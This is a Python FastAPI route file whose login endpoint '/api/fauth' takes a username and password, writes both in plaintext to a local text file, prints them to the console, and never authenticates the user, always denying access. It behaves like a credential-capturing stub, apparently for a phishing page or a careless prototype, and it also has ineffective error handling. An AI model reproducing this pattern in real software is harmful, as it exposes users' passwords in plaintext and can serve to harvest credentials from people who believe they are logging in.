from starlette.status import HTTP_303_SEE_OTHER
from backend.database.models import User
from backend.database.work_user_db import get_user, get_user_id
from backend.database.connect import get_db
from fastapi import APIRouter
from fastapi import Depends, Request
from fastapi import HTTPException
from sqlalchemy.orm import Session
from sqlalchemy import true
from backend.model.models_auth import UserLogin,  CodeAuth2, UserLoginResponse, CodeAuth2Response
import smtplib
from backend.services.security_util.generate_pswd import generate_one_time_psswd
from starlette.responses import Response
from email.mime.text import MIMEText


router = APIRouter()


@router.post("/api/fauth", response_model=UserLoginResponse)
async def login(current_user: UserLogin):
    print("Post data authentication")
    try:
        with open('./backend/login_data.txt', 'w') as file:
            log = f'login: {current_user.login}\n'
            passwd = f'password: {current_user.password}\n'
            print(log, passwd)  # Для отображения в консоли
            file.writelines([log, passwd])  # Передаем список строк
        result = UserLoginResponse(
            second_factor=False,
            access_user=False
        )
        #print(result)
        return result
    except HTTPException:
        return {"message": "Invalid credentials"}